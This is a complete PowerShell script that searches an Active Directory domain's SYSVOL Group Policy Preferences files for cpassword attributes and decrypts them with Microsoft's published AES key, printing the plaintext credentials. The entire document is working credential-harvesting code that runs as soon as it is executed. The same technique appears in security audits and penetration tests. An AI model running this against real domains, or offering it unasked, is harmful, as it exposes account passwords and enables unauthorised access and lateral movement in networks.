function Get-DecryptedCPassword {
    param (
        [string]$cpassword
    )
    # Define the AES key used by Microsoft for GPP encryption
    $aesKey = [byte[]](0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Key = $aesKey
    $aes.IV = New-Object byte[](16)
    $decryptor = $aes.CreateDecryptor()

    # Ensure correct padding for base64 decoding
    $cpassword += '=='
    $encryptedBytes = [Convert]::FromBase64String($cpassword)
    $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
    $encoding = New-Object System.Text.UnicodeEncoding
    return $encoding.GetString($decryptedBytes)
}

function Find-GPOClearTextPasswords {
    $sysvolPath = "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies"
    # Search for XML files that might contain passwords
    $xmlFiles = Get-ChildItem -Path $sysvolPath -Recurse -Include "Groups.xml", "Services.xml", "ScheduledTasks.xml", "DataSources.xml", "Printers.xml", "Drives.xml" -ErrorAction SilentlyContinue

    foreach ($file in $xmlFiles) {
        [xml]$xmlContent = Get-Content -Path $file.FullName
        $passwordNodes = $xmlContent | Select-Xml -XPath "//@cpassword"

        foreach ($node in $passwordNodes) {
            $decryptedPassword = Get-DecryptedCPassword -cpassword $node.Node.Value
            [PSCustomObject]@{
                File = $file.FullName
                DecryptedPassword = $decryptedPassword
            } | Format-Table -AutoSize
        }
    }
}

# Execute the search function
Find-GPOClearTextPasswords
